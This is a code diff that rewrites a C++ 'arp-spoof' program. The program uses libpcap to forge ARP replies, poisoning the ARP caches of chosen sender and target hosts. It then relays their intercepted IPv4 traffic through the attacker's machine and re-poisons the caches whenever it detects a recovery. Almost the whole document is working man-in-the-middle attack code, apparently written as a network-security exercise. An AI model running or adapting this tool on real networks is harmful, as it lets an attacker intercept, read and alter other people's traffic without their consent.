@@ -1,240 +1,374 @@
-#include "util.h"
-#include <vector>
+#include "pch.h"
+#include <cstdio>
 #include <iostream>
+#include <csignal>
 
-typedef struct {
-    uint32_t ip_send;
-    uint32_t ip_tar;
-} thrArg;
+#include <pcap.h>
+#include <pthread.h>
+#include <set>
+#include <map>
+#include <vector>
+#include <algorithm>
 
-#define ARP_SIZE 42
+#include "ethhdr.h"
+#include "arphdr.h"
+#include "iphdr.h"
 
-struct IpMacPair{
-	IpMacPair(const char* ip, const uint8_t* mac) {
-		strncpy(ip_addr, ip, sizeof(ip_addr) - 1);
-		ip_addr[sizeof(ip_addr) - 1] = '\0';
-		memcpy(mac_addr, mac, Mac::SIZE);
-	}
-	char ip_addr[20]={0,};
-	uint8_t mac_addr[20]={0,};
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <linux/if.h>
+
+#pragma pack(push, 1)
+struct EthArpPacket final {
+    EthHdr eth_;
+    ArpHdr arp_;
 };
-std::vector<IpMacPair> ip_mac_table;
-bool findMacByIp(const std::vector<IpMacPair>& dict, const char* ip_str, uint8_t* mac_out) {
-    for (const auto& pair : dict) {
-        if (strcmp(pair.ip_addr,ip_str)==0) {
-            std::memcpy(mac_out, pair.mac_addr, 6);
-            return true;
+#pragma pack(pop)
+
+volatile bool g_running = true;
+
+void signal_handler(int signum) {
+    printf("\n[*] Caught signal %d, shutting down gracefully...\n", signum);
+    g_running = false;
+}
+
+char* dev;
+
+void print_addr(std::string label, Ip& ip, Mac& mac) {
+    std::cout << "┌─────────────────────────────────┐" << std::endl;
+    std::cout << "│ " << label << " Information" << std::endl;
+    std::cout << "├─────────────────────────────────┤" << std::endl;
+    std::cout << "│ IP  : " << std::string(ip) << std::endl;
+    std::cout << "│ MAC : " << std::string(mac) << std::endl;
+    std::cout << "└─────────────────────────────────┘" << std::endl;
+}
+
+Ip aip; Mac amac;
+void load_addr(Ip& ip, Mac& mac){
+    printf("[+] Loading attacker's network information...\n");
+
+    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sfd == -1) {
+        perror("socket");
+        exit(1);
+    }
+
+    struct ifreq ifr;
+    strcpy(ifr.ifr_name, dev);
+
+    // Get IP address
+    if (ioctl(sfd, SIOCGIFADDR, &ifr) == -1) {
+        perror("ioctl(SIOCGIFADDR)");
+        close(sfd);
+        exit(1);
+    }
+    ip = Ip(ntohl(((sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
+
+    // Get MAC address
+    if (ioctl(sfd, SIOCGIFHWADDR, &ifr) == -1) {
+        perror("ioctl(SIOCGIFHWADDR)");
+        close(sfd);
+        exit(1);
+    }
+    mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
+
+    close(sfd);
+    printf("[+] Network information loaded successfully\n");
+}
+
+std::map<Ip,Mac> cache;
+Mac& get_mac(pcap_t* pcap, Ip& ip) {
+    if (cache.find(ip) != cache.end()) {
+        //printf("[CACHE] MAC for %s found in cache: %s\n",std::string(ip).c_str(), std::string(cache[ip]).c_str());
+        return cache[ip];
+    }
+
+    printf("[ARP] Resolving MAC address for %s...\n", std::string(ip).c_str());
+
+    Mac& mac = cache[ip];
+    EthArpPacket packet;
+    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+    packet.eth_.smac_ = Mac(amac);
+    packet.eth_.type_ = htons(EthHdr::ETHERTYPE_ARP);
+    packet.arp_.hrd_ = htons(ArpHdr::HTYPE_ETHER);
+    packet.arp_.pro_ = htons(EthHdr::ETHERTYPE_IPV4);
+    packet.arp_.hln_ = Mac::Size;
+    packet.arp_.pln_ = Ip::Size;
+    packet.arp_.op_ = htons(ArpHdr::OP_REQUEST);
+    packet.arp_.smac_ = Mac(amac);
+    packet.arp_.sip_ = htonl(aip);
+    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+    packet.arp_.tip_ = htonl(ip);
+
+    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "[ERROR] pcap_sendpacket failed: %s\n", pcap_geterr(pcap));
+    } else {
+        printf("[ARP] Request sent for %s\n", std::string(ip).c_str());
+    }
+
+    // Wait for ARP reply
+    int retry_count = 0;
+    while(retry_count < 100) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(pcap, &header, &packet);
+        if (res == 0) {
+            retry_count++;
+            continue;
         }
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            fprintf(stderr, "[ERROR] pcap_next_ex failed: %s\n", pcap_geterr(pcap));
+            break;
+        }
+
+        EthHdr* eth_hdr = (EthHdr*)packet;
+        ArpHdr* arp_hdr = (ArpHdr*)(eth_hdr + 1);
+
+        if (eth_hdr->type() == EthHdr::ETHERTYPE_ARP &&
+            arp_hdr->op() == ArpHdr::OP_REPLY &&
+            arp_hdr->sip() == ip) {
+            mac = arp_hdr->smac();
+            printf("[SUCCESS] MAC address resolved for %s: %s\n",std::string(ip).c_str(), std::string(mac).c_str());
+            break;
+        }
+        retry_count++;
     }
-    return false;
+
+    if (retry_count >= 100) {
+        fprintf(stderr, "[WARNING] Timeout while resolving MAC for %s\n",std::string(ip).c_str());
+    }
+    return mac;
 }
 
-char ifn[10];
+void poison(pcap_t* pcap, Ip& sip, Ip& tip) {
+    Mac smac = get_mac(pcap, sip);
 
-char ip_atck[20];
-uint8_t mac_atck[20];
+    EthArpPacket packet;
+    packet.eth_.dmac_ = Mac(smac);
+    packet.eth_.smac_ = Mac(amac);
+    packet.eth_.type_ = htons(EthHdr::ETHERTYPE_ARP);
+    packet.arp_.hrd_ = htons(ArpHdr::HTYPE_ETHER);
+    packet.arp_.pro_ = htons(EthHdr::ETHERTYPE_IPV4);
+    packet.arp_.hln_ = Mac::Size;
+    packet.arp_.pln_ = Ip::Size;
+    packet.arp_.op_ = htons(ArpHdr::OP_REPLY);
+    packet.arp_.smac_ = amac;
+    packet.arp_.sip_ = htonl(tip);
+    packet.arp_.tmac_ = smac;
+    packet.arp_.tip_ = htonl(sip);
 
-
-void* infect(void* arg){
-	thrArg *args = (thrArg*)arg;
-
-	// Err Setting
-	char errbuf[PCAP_ERRBUF_SIZE];
-
-	EthArpPacket packet;
-	struct pcap_pkthdr *pkth;
-	const u_char *pkt_data;
-
-	
-	char ip_send[20]={0,}, ip_tar[20]={0,};
-	uint8_t mac_send[20], mac_tar[20];
-
-	
-	IntIpChar(ip_send, args->ip_send);
-	IntIpChar(ip_tar, args->ip_tar);
-	
-	// Load MAC Address
-    if (!findMacByIp(ip_mac_table, ip_send, mac_send)) {
-        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_send);
-        pthread_exit(NULL);
+    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "[ERROR] Poison packet send failed: %s\n", pcap_geterr(pcap));
+    } else {
+        //printf("[SPOOF] ARP poison sent: %s thinks %s is at %s\n",std::string(sip).c_str(), std::string(tip).c_str(),std::string(amac).c_str());
     }
-    if (!findMacByIp(ip_mac_table, ip_tar, mac_tar)) {
-        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_tar);
-        pthread_exit(NULL);
-    }
-
-	// Open PCAP
-	pcap_t* hd = pcap_open_live(ifn, ARP_SIZE, 1, 1, errbuf);
-	if (hd == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", ifn, errbuf);
-		pthread_exit(NULL);
-	}
-	
-	while(1){
-		change_arp_table(hd, ip_send, ip_tar, ip_atck, mac_send, mac_atck);
-		change_arp_table(hd, ip_tar, ip_send, ip_atck, mac_tar, mac_atck);
-		sleep(1);
-	}
-
-	pcap_close(hd);
-	pthread_exit(NULL);
-
 }
 
+struct thrArgs {
+    Ip sender;
+    Ip target;
+};
+
+void* infect(void* arg) {
+    thrArgs* args = (thrArgs*)(arg);
+    Ip sip = args->sender;
+    Ip tip = args->target;
+    delete args;  // Free memory
+
+    printf("[INFECT] Thread started for %s <-> %s\n",std::string(sip).c_str(), std::string(tip).c_str());
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (pcap == nullptr) {
+        fprintf(stderr, "[ERROR] Infect thread failed to open device: %s\n", errbuf);
+        return nullptr;
+    }
+
+    while(g_running){
+        poison(pcap, sip, tip); poison(pcap, tip, sip);
+        sleep(1);
+    }
+
+    printf("[INFECT] Thread stopping for %s <-> %s\n",std::string(sip).c_str(), std::string(tip).c_str());
+    pcap_close(pcap);
+    return nullptr;
+}
 
 void* attack(void* arg){
-	thrArg *args = (thrArg*)arg;
+    thrArgs* args = (thrArgs*)(arg);
+    Ip sip = args->sender;
+    Ip tip = args->target;
 
-	// Err Setting
-	char errbuf[PCAP_ERRBUF_SIZE];
+    printf("[ATTACK] Thread started for %s <-> %s\n",std::string(sip).c_str(), std::string(tip).c_str());
 
-	EthArpPacket packet;
-	struct pcap_pkthdr *pkth;
-	const u_char *pkt_data;
-
-	
-	char ip_send[20]={0,}, ip_tar[20]={0,};
-	uint8_t mac_send[20], mac_tar[20];
-
-	
-	IntIpChar(ip_send, args->ip_send);
-	IntIpChar(ip_tar, args->ip_tar);
-	
-	// Load MAC Address
-    if (!findMacByIp(ip_mac_table, ip_send, mac_send)) {
-        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_send);
-        exit(1);
-    }
-    if (!findMacByIp(ip_mac_table, ip_tar, mac_tar)) {
-        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_tar);
-        exit(1);
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (pcap == nullptr) {
+        fprintf(stderr, "[ERROR] Attack thread failed to open device: %s\n", errbuf);
+        delete args;
+        return nullptr;
     }
 
-	printf("\n\n****Mac Addr Capture Success!****\n\n");
-
-	// Open PCAP
-	pcap_t* hd = pcap_open_live(ifn, ARP_SIZE, 1, 1, errbuf);
-	if (hd == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", ifn, errbuf);
-		return 0;
-	}
-
-	pthread_t arp_thread;
-    if (pthread_create(&arp_thread, NULL, infect, (void*)args) != 0) {
-        perror("pthread_create for Target ARP table infection failed");
-        pcap_close(hd);
-        pthread_exit(NULL);
+    // Create infect thread
+    thrArgs* infect_args = new thrArgs;
+    infect_args->sender = sip;
+    infect_args->target = tip;
+    pthread_t infect_thread;
+    if(pthread_create(&infect_thread, nullptr, infect, (void*)infect_args) != 0) {
+        fprintf(stderr, "[ERROR] Failed to create infect thread for %s <-> %s\n",
+                std::string(sip).c_str(), std::string(tip).c_str());
+        delete infect_args;
+    } else {
+        pthread_detach(infect_thread);
     }
-    pthread_detach(arp_thread); // Let the ARP sending thread run independently
-	
+    delete args;
+    Mac smac = get_mac(pcap, sip);
+    Mac tmac = get_mac(pcap, tip);
+    poison(pcap, sip, tip); poison(pcap, tip, sip);
+    printf("[ATTACK] Ready to relay packets between:\n");
+    printf("         Sender: %s (%s)\n", std::string(sip).c_str(), std::string(smac).c_str());
+    printf("         Target: %s (%s)\n", std::string(tip).c_str(), std::string(tmac).c_str());
 
-	printf("\n\n****ARP Table Infected!****\n\n");
+    int relay_count = 0;
+    int reinfect_count = 0;
 
-	struct EthHdr *eth_hdr;
-	struct ArpHdr *arp_hdr;
-	struct IpHdr *ip_hdr;
-	int res;
-	
-	while(1){
-		res = pcap_next_ex(hd, &pkth, &pkt_data);
-		if (res != 1) {
-			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(hd));
-			return 0;
-		}
-	
-		eth_hdr = (EthHdr*)pkt_data;
-		
-		// If packet is ARP
-		if(ntohs(eth_hdr->type_) == EthHdr::Arp){
-			arp_hdr = (ArpHdr*)(eth_hdr + 1);
-			if(ntohl(Ip(arp_hdr->sip_)) == Ip(ip_tar) && arp_hdr->smac_==Mac(mac_tar) && ntohs(arp_hdr->op_) == ArpHdr::Reply){
-				printf("Sender ARP Table Recovered!\n");
-				change_arp_table(hd, ip_send, ip_tar, ip_atck, mac_send, mac_atck);
-			}	
-		}
+    while (g_running) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(pcap, &header, &packet);
 
-		// If packet is IPV4
-		else if(ntohs(eth_hdr->type_) == EthHdr::Ip4){
-			ip_hdr = (IpHdr*)(eth_hdr + 1);
-			if(Ip(ip_tar) != Ip(ip_atck) && (uint32_t)Ip(ip_send) == ntohl(Ip(ip_hdr->ip_src))){
-				printf("Relay\ndestination: %s\n\n", ip_tar);
-				eth_hdr->smac_ = Mac(mac_atck);
-				eth_hdr->dmac_ = Mac(mac_tar);
-				res = pcap_sendpacket(hd, pkt_data, pkth->len);
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd));
-					break;
-				}
-			}
+        if (!g_running) break;
 
-		}
-		
-	}
+        if (res == 0) continue;  // Timeout
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+            fprintf(stderr, "[ERROR] pcap_next_ex failed: %s\n", pcap_geterr(pcap));
+            break;
+        }
 
-	pcap_close(hd);
-	pthread_exit(NULL);
+        EthHdr* eth_hdr = (EthHdr*)packet;
+        // IP Packet Relay
+        if (eth_hdr->type() == EthHdr::ETHERTYPE_IPV4) {
+            IpHdr* ip_hdr = (IpHdr*)(eth_hdr + 1);
+            if (ip_hdr->sip() == aip || ip_hdr->dip() == aip) continue;
+            if (ip_hdr->sip() == sip || ip_hdr->dip() == tip) {
+                eth_hdr->smac_ = amac;
+                eth_hdr->dmac_ = tmac;
+                res = pcap_sendpacket(pcap, packet, header->caplen);
+                if (res != 0) {
+                    fprintf(stderr, "[ERROR] Failed to relay packet: %s\n", pcap_geterr(pcap));
+                } else {
+                    relay_count++;
+                    printf("[RELAY] Packet #%d: %s -> %s (size: %u)\n", relay_count, std::string(ip_hdr->sip()).c_str(),std::string(ip_hdr->dip()).c_str(), header->caplen);
+                }
+            }
+            if (ip_hdr->sip() == tip || ip_hdr->dip() == sip) {
+                eth_hdr->smac_ = amac;
+                eth_hdr->dmac_ = smac;
+                res = pcap_sendpacket(pcap, packet, header->caplen);
+                if (res != 0) {
+                    fprintf(stderr, "[ERROR] Failed to relay packet: %s\n", pcap_geterr(pcap));
+                } else {
+                    relay_count++;
+                    printf("[RELAY] Packet #%d: %s <- %s (size: %u)\n", relay_count, std::string(ip_hdr->sip()).c_str(),std::string(ip_hdr->dip()).c_str(), header->caplen);
+                }
+            }
+        }
+        // ARP Packet Block & Reinfect
+        // Case 1 : ARP Request from sip(smac) to tip(amac) -> Reply
+        // Case 2 : ARP Request from sip(smac) to tip(broadcast) -> Reinfect
+        // Case 3 : ARP Request from tip(tmac) to sip(amac) -> Reply
+        // Case 4 : ARP Request from tip(tmac) to sip(broadcast) -> Reinfect
+        // Case 5 : Any ARP Packet with Valid Source IP, Source MAC Pair Information
+        //1 U 2 U 3 U 4 ( 5
+        if (eth_hdr->type() == EthHdr::ETHERTYPE_ARP) {
+            ArpHdr* arp_hdr = (ArpHdr*)(eth_hdr + 1);
+            if (arp_hdr->sip() == sip && arp_hdr->smac() == smac || arp_hdr->sip() == tip && arp_hdr->smac() == tmac) {
+                reinfect_count++;
+                printf("[ARP] Recovery detected! Reinfecting... (count: %d)\n", reinfect_count);
+                poison(pcap, sip, tip); poison(pcap,tip,sip);
+            }
+        }
 
+    }
+
+    printf("[ATTACK] Thread stopping for %s -> %s\n", std::string(sip).c_str(), std::string(tip).c_str());
+    printf("[STATS] Total packets relayed: %d, ARP reinfections: %d\n",relay_count, reinfect_count);
+
+    pcap_close(pcap);
+    return nullptr;
 }
 
+void restore();
+
 void usage() {
-	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
-	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
+    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
+    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
 int main(int argc, char* argv[]) {
-	
-	if (argc%2 != 0 || argc < 4) {
-		usage();
-		return -1;
-	}
-
-	strcpy(ifn, argv[1]);
-	get_ip(ifn,ip_atck);
-	get_mac(ifn,mac_atck);
-
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* hd = pcap_open_live(ifn, ARP_SIZE, 1, 1, errbuf);
-	if (hd == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", ifn, errbuf);
-		exit(1);
-	}
-
-	uint8_t mac_tmp[10];
-	for(int i = 2; i < argc; i++) {
-		request_mac(hd,argv[i],mac_atck,ip_atck,mac_tmp);
-		ip_mac_table.emplace_back(argv[i],mac_tmp);
-	}
-
-	// Show ip_mac_table
-	 for (const auto& item : ip_mac_table) {
-        std::cout << "IP: " << item.ip_addr << ", MAC: ";
-        for (int i = 0; i < Mac::SIZE; ++i) {
-            printf("%02x%s", item.mac_addr[i], (i < Mac::SIZE - 1) ? ":" : "");
-        }
-		printf("\n");
+    if (argc < 4 || argc % 2 != 0) {
+        usage();
+        return EXIT_FAILURE;
     }
 
-	pthread_t thread;
-	thrArg *arg;
-	for(int i = 2; i < argc; i += 2) {
-		arg = (thrArg*)malloc(sizeof(thrArg));
-		if (arg == nullptr) {
-			perror("malloc failed");
-			exit(1);
-		}
-		arg->ip_send = Ip(argv[i]);
-		arg->ip_tar = Ip(argv[i+1]);
+    // Register signal handlers
+    std::signal(SIGINT, signal_handler);
+    std::signal(SIGKILL, signal_handler);
+    std::signal(SIGTERM, signal_handler);
+    printf("[*] Signal handlers registered (Ctrl+C to stop)\n");
 
-		if (pthread_create(&thread, NULL, attack, (void*)arg) != 0) {
-			perror("pthread_create failed");
-			free(arg);
-			exit(1);
-		}
-		pthread_detach(thread);
-	}
-	pcap_close(hd);
+    dev = argv[1];
+    printf("[*] Using interface: %s\n", dev);
 
-    while(1) sleep(1);
+    // Load attacker's network information
+    load_addr(aip, amac);
+    print_addr("Attacker", aip, amac);
 
+    std::vector<pthread_t> threads;
+    std::set<std::pair<Ip,Ip>> flow;
 
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (pcap == nullptr) {
+        fprintf(stderr, "failed to open device: %s\n", errbuf);
+        return 1;
+    }
+
+    printf("\n[*] Scaning Mac...\n");
+    for(int i = 2; i < argc; i++) {
+        Ip ip = Ip(argv[i]);
+        get_mac(pcap,ip);
+    }
+
+    for(int i = 2; i < argc; i += 2) {
+        Ip sender_ip = Ip(argv[i]); Ip target_ip = Ip(argv[i+1]);
+        if(sender_ip > target_ip) std::swap(sender_ip, target_ip);
+        if(flow.find({sender_ip,target_ip}) != flow.end()) continue;
+        printf("[*] Processing pair: %s <-> %s\n",std::string(sender_ip).c_str(), std::string(target_ip).c_str());
+        flow.insert({sender_ip,target_ip});
+
+        thrArgs* args = new thrArgs;
+        args->sender = sender_ip;
+        args->target = target_ip;
+        pthread_t thread;
+        if(pthread_create(&thread, nullptr, attack, args) != 0) {
+            fprintf(stderr, "[ERROR] Failed to create attack thread\n");
+            delete args;
+            continue;
+        }
+        threads.push_back(thread);
+    }
+
+    // Wait for all threads to complete
+    for(pthread_t& thread : threads) {
+        pthread_join(thread, nullptr);
+    }
+
+    printf("\n[*] All threads have terminated\n");
+    printf("\n[*] Cleanup complete. Exiting...\n");
+    printf("═══════════════════════════════════════\n\n");
+
+    return 0;
 }
